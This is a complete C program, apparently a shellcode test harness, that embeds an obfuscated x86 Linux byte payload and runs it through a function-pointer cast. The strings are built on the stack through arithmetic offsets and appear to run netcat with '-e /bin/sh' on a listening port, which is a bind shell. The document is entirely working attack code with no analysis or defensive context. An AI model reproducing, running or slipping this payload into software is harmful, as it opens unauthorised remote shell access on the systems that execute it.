#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\x31\xd2\xf7\xe2\x52\xbe\x36\x36\x36\x30\x81\xc6\x01\x01\x01\x01\x56\x81\xc6\x01\x01\x01\x21\x81\xee\x0b\xc2\xc7\x20\x56\x89\xe6\x52\xbf\x30\x2f\x73\x68\x4f\x57\x47\x81\xc7\xff\x32\xf6\x05\x57\x68\x2d\x6c\x65\x2f\x89\xe7\x52\xba\x2e\x2f\x6e\x63\x42\x52\x4a\x81\xc2\x01\x33\xfb\x0a\x52\x89\xe3\x31\xd2\x50\x56\x57\x53\x89\xe1\xb0\x0c\x48\xcd\x80";
int main(int argc, char* argv[])
{
	printf("\nShellcode 1 Length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}

